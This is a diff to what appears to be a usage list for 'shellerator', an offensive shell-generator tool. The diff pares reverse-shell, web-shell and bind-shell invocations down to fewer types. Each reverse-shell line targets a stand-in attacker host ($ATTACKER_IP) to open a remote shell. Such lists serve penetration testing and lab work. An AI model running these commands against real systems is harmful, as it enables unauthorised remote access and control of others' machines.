@@ -1,34 +1,13 @@
-shellerator --reverse-shell --lhost "$ATTACKER_IP" --lport 1337 --type powershell
-shellerator --reverse-shell --lhost "$ATTACKER_IP" --lport 1337 --type bash
-shellerator --reverse-shell --lhost "$ATTACKER_IP" --lport 1337 --type busybox
-shellerator --reverse-shell --lhost "$ATTACKER_IP" --lport 1337 --type msfvenom
-shellerator --reverse-shell --lhost "$ATTACKER_IP" --lport 1337 --type php
-shellerator --reverse-shell --lhost "$ATTACKER_IP" --lport 1337 --type aspx
-shellerator --reverse-shell --lhost "$ATTACKER_IP" --lport 1337 --type python
-shellerator --reverse-shell --lhost "$ATTACKER_IP" --lport 1337 --type groovy
-shellerator --reverse-shell --lhost "$ATTACKER_IP" --lport 1337 --type netcat
-shellerator --reverse-shell --lhost "$ATTACKER_IP" --lport 1337 --type ncat
-shellerator --reverse-shell --lhost "$ATTACKER_IP" --lport 1337 --type perl
-shellerator --reverse-shell --lhost "$ATTACKER_IP" --lport 1337 --type ruby
-shellerator --reverse-shell --lhost "$ATTACKER_IP" --lport 1337 --type socat
-shellerator --reverse-shell --lhost "$ATTACKER_IP" --lport 1337 --type telnet
-shellerator --reverse-shell --lhost "$ATTACKER_IP" --lport 1337 --type tclsh
-shellerator --reverse-shell --lhost "$ATTACKER_IP" --lport 1337 --type java
-shellerator --reverse-shell --lhost "$ATTACKER_IP" --lport 1337 --type openssl
-shellerator --reverse-shell --lhost "$ATTACKER_IP" --lport 1337 --type nodejs
-shellerator --reverse-shell --lhost "$ATTACKER_IP" --lport 1337 --type golang
-shellerator --reverse-shell --lhost "$ATTACKER_IP" --lport 1337 --type lua
-shellerator --reverse-shell --lhost "$ATTACKER_IP" --lport 1337 --type awk
-shellerator --reverse-shell --lhost "$ATTACKER_IP" --lport 1337 --type crystal
+shellerator --reverse-shell --lhost "$ATTACKER_IP" --type ncat --lport 1337
+shellerator --reverse-shell --lhost "$ATTACKER_IP" --type netcat --lport 1337
+shellerator --reverse-shell --lhost "$ATTACKER_IP" --type php --lport 1337
+shellerator --reverse-shell --lhost "$ATTACKER_IP" --type python --lport 1337
+shellerator --reverse-shell --lhost "$ATTACKER_IP" --type bash --lport 1337
+shellerator --reverse-shell --lhost "$ATTACKER_IP" --type powershell --lport 1337
 shellerator --web-shell --type php
 shellerator --web-shell --type asp
-shellerator --web-shell --type aspx
-shellerator --web-shell --type jsp
-shellerator --bind-shell --lport 1337 --type ncat 
-shellerator --bind-shell --lport 1337 --type netcat
-shellerator --bind-shell --lport 1337 --type perl
-shellerator --bind-shell --lport 1337 --type powershell
-shellerator --bind-shell --lport 1337 --type python
-shellerator --bind-shell --lport 1337 --type ruby
-shellerator --bind-shell --lport 1337 --type socat
+shellerator --bind-shell --type ncat  --lport 1337
+shellerator --bind-shell --type netcat --lport 1337
+shellerator --bind-shell --type powershell  --lport 1337
+shellerator --bind-shell --type  python --lport 1337
 shellerator --list
